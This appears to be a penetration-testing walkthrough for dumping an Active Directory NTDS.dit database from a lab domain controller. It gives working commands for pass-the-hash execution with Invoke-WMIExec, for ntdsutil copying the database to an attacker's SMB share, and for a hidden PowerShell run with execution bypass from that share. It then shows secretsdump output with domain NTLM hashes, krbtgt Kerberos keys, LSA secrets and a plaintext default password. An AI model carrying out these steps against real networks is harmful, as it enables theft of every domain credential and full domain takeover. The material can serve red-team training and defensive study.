## Dump NTDS.dit file from target server:

How Attackers Dump Active Directory Database Credentials: https://adsecurity.org/?p=2398

How-to-dump-windows2012-credentials: https://github.com/nixawk/pentest-wiki/blob/master/4.Post-Exploitation/Windows_ActiveDirectory/How-to-dump-windows2012-credentials.md

Invoke-TheHash: https://github.com/Kevin-Robertson/Invoke-TheHash

### Find NTDS.dit file location using this command in CMD and Powershell
```
PS C:\> reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
    System Schema Version    REG_DWORD    0x38
    Root Domain    REG_SZ    DC=test,DC=local
    Configuration NC    REG_SZ    CN=Configuration,DC=test,DC=local
    Machine DN Name    REG_SZ    CN=NTDS Settings,CN=WIN-PJNUFB8U83P,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=test,DC=local
    DsaOptions    REG_SZ    1
    IsClone    REG_DWORD    0x0
    ServiceDll    REG_EXPAND_SZ    %systemroot%\system32\ntdsa.dll
    DSA Working Directory    REG_SZ    C:\Windows\NTDS
    DSA Database file    REG_SZ    C:\Windows\NTDS\ntds.dit
    Database backup path    REG_SZ    C:\Windows\NTDS\dsadata.bak
    Database log files path    REG_SZ    C:\Windows\NTDS
    Hierarchy Table Recalculation interval (minutes)    REG_DWORD    0x2d0
    Database logging/recovery    REG_SZ    ON
    DS Drive Mappings    REG_MULTI_SZ    c:\=\\?\Volume{7e3f7bcd-5ece-11e6-93e8-806e6f6e6963}\
    DSA Database Epoch    REG_DWORD    0x79fd
    Strict Replication Consistency    REG_DWORD    0x1
    Schema Version    REG_DWORD    0x38
    ldapserverintegrity    REG_DWORD    0x1
    Global Catalog Promotion Complete    REG_DWORD    0x1
   
PS C:\> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters

System Schema Version                            : 56
Root Domain                                      : DC=test,DC=local
Configuration NC                                 : CN=Configuration,DC=test,DC=local
Machine DN Name                                  : CN=NTDS Settings,CN=WIN-PJNUFB8U83P,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=test,DC=local
DsaOptions                                       : 1
IsClone                                          : 0
ServiceDll                                       : C:\Windows\system32\ntdsa.dll
DSA Working Directory                            : C:\Windows\NTDS
DSA Database file                                : C:\Windows\NTDS\ntds.dit
Database backup path                             : C:\Windows\NTDS\dsadata.bak
Database log files path                          : C:\Windows\NTDS
Hierarchy Table Recalculation interval (minutes) : 720
Database logging/recovery                        : ON
DS Drive Mappings                                : {c:\=\\?\Volume{7e3f7bcd-5ece-11e6-93e8-806e6f6e6963}\}
DSA Database Epoch                               : 31229
Strict Replication Consistency                   : 1
Schema Version                                   : 56
ldapserverintegrity                              : 1
Global Catalog Promotion Complete                : 1
PSPath                                           : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
PSParentPath                                     : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS
PSChildName                                      : Parameters
PSDrive                                          : HKLM
PSProvider                                       : Microsoft.PowerShell.Core\Registry
```

### Make sure `temp` folder in SMB share is writable and empty before NTDSUtil tries writing to it

### Using batch script:
```
root@kali:/mnt/smb_share/temp# cat ../exp.bat 
ntdsutil "ac i ntds" "ifm" "create full \\192.168.136.128\kali_smb_share\temp" q q

PS C:\> Invoke-WMIExec -verbose -Domain test.local -Username master -Hash 4557b6a0a22dc7cafd03c4a40e77f7e1 -Target 192.168.136.130 -Command "cmd /c \\192.168.136.128\kali_smb_share\exp.bat"
VERBOSE: Connecting to 192.168.136.130:135
VERBOSE: WMI reports target hostname as WIN-PJNUFB8U83P
VERBOSE: test.local\master accessed WMI on 192.168.136.130
VERBOSE: Using WIN-PJNUFB8U83P for random port extraction
VERBOSE: Connecting to 192.168.136.130:49154
VERBOSE: Attempting command execution
Command executed with process ID 3116 on 192.168.136.130
```

### Using powershell script:
```
root@kali:/mnt/smb_share/temp# cat ../exp.ps1 
$A = Invoke-Expression 'ntdsutil "ac i ntds" "ifm" "create full \\192.168.136.128\kali_smb_share\temp" q q' -ErrorVariable $B -WarningVariable $C -Verbose
Out-File -FilePath \\192.168.136.128\kali_smb_share\temp\out.log -InputObject $A -Encoding ASCII
Out-File -FilePath \\192.168.136.128\kali_smb_share\temp\error.log -InputObject $B -Encoding ASCII
Out-File -FilePath \\192.168.136.128\kali_smb_share\temp\warning.log -InputObject $C -Encoding ASCII

PS C:\> Invoke-WMIExec -verbose -Domain test.local -Username master -Hash 4557b6a0a22dc7cafd03c4a40e77f7e1 -Target 192.168.136.130 -Command "powershell -NoP -sta -NonI -W Hidden -Exec bypass -File \\192.168.136.128\kali_smb_share\exp.ps1"
VERBOSE: Connecting to 192.168.136.130:135
VERBOSE: WMI reports target hostname as WIN-PJNUFB8U83P
VERBOSE: test.local\master accessed WMI on 192.168.136.130
VERBOSE: Using WIN-PJNUFB8U83P for random port extraction
VERBOSE: Connecting to 192.168.136.130:49154
VERBOSE: Attempting command execution
Command executed with process ID 3128 on 192.168.136.130
```

## Dump contents of NTDS.dit file

```
root@kali:/mnt/smb_share/temp# locate smbexec.py
/opt/Veil/Veil-Pillage/lib/impacket_smbexec.py
/usr/local/bin/smbexec.py
/usr/share/doc/python-impacket/examples/smbexec.py
/usr/share/keimpx/lib/smbexec.py

root@kali:/mnt/smb_share/temp# secretsdump.py -system '/mnt/smb_share/temp/registry/SYSTEM' -security '/mnt/smb_share/temp/registry/SECURITY' -ntds '/mnt/smb_share/temp/Active Directory/ntds.dit' LOCAL
Impacket v0.9.13 - Copyright 2002-2015 Core Security Technologies

INFO:root:Target system bootKey: 0xc2aaa99b063f6b9c9c836e8a9d0b6b59
INFO:root:Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)
INFO:root:Dumping LSA Secrets
INFO:root:$MACHINE.ACC 
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:033513a7b82596b25264a1ca49203824
INFO:root:DefaultPassword 
(Unknown User):ROOT#123
INFO:root:DPAPI_SYSTEM 
 0000   01 00 00 00 63 09 9F 09  CA 4C FB 62 38 6A FE 37   ....c....L.b8j.7
 0010   9E 74 4F B8 1C CF EC F5  6A 1A DA 56 67 5F 1F 13   .tO.....j..Vg_..
 0020   14 BC 43 2B BB 79 EA C8  7B AF EE 82               ..C+.y..{...
INFO:root:NL$KM 
 0000   D7 BB 16 96 AB 11 49 D9  E6 38 CC 46 59 EC CC 65   ......I..8.FY..e
 0010   1E 17 D2 BC B2 33 E5 97  A9 91 5A 1F D7 79 37 71   .....3....Z..y7q
 0020   F9 40 A4 8D 5F 66 9C 5B  69 4A 70 C7 E8 ED 1D B8   .@.._f.[iJp.....
 0030   1A 54 30 E1 AB 6C FA F3  96 97 96 E5 F0 F1 DD 99   .T0..l..........
INFO:root:Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
INFO:root:Searching for pekList, be patient
INFO:root:Pek found and decrypted: 0xed11979a1de0316229732c75231f7d7d
INFO:root:Reading and decrypting hashes from /mnt/smb_share/temp/Active Directory/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cb136a448767792bae25563a498a86e6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test1:1001:aad3b435b51404eeaad3b435b51404ee:393ee50e62f891cb5b7ae3ead79376ac:::
test2:1002:aad3b435b51404eeaad3b435b51404ee:6b1d71c4691455f46c59bae11126d4a4:::
WIN-PJNUFB8U83P$:1003:aad3b435b51404eeaad3b435b51404ee:033513a7b82596b25264a1ca49203824:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c728695aa9b97cb064a5de26ba77112d:::
test.local\slave:1107:aad3b435b51404eeaad3b435b51404ee:ff5484488517e138ef86fbb3e7fe1133:::
test.local\master:1108:aad3b435b51404eeaad3b435b51404ee:4557b6a0a22dc7cafd03c4a40e77f7e1:::
INFO:root:Kerberos keys from /mnt/smb_share/temp/Active Directory/ntds.dit 
WIN-PJNUFB8U83P$:aes256-cts-hmac-sha1-96:0126f1b74a8b21d3240e04cd7fd1b15f3900850d6b8453a95bc71d3fbe431a25
WIN-PJNUFB8U83P$:aes128-cts-hmac-sha1-96:92618b22bf62c7251c433a19c537ea6c
WIN-PJNUFB8U83P$:des-cbc-md5:f18a4aad4938b564
krbtgt:aes256-cts-hmac-sha1-96:6d6607f3c1c56697436abf49a380a8f2f0486bd177201b1b245c01310328cb3b
krbtgt:aes128-cts-hmac-sha1-96:695845f807093ce19c7f4ff79dcdc023
krbtgt:des-cbc-md5:5eb564893e73027c
test.local\slave:aes256-cts-hmac-sha1-96:1062fece2758c08941859d7482d2786e49cdc35899c0f7824148f9b68853d1d8
test.local\slave:aes128-cts-hmac-sha1-96:b415a6275c7b49c27090a823d55d5e9e
test.local\slave:des-cbc-md5:626dababb558d54a
test.local\master:aes256-cts-hmac-sha1-96:667dd1da063265b55cf5abe47e4b743b7019a831e51cb5675653bcb5652896da
test.local\master:aes128-cts-hmac-sha1-96:02383fd8e3322ce68eb131984ba8c37d
test.local\master:des-cbc-md5:d63173252cf42fc1
INFO:root:Cleaning up...
```

## Note
All the hashes and passwords you will find above are not being used/re-used by me anywhere and the test machine where it was generated was destroyed. Contact me if you still want the plaintext data.
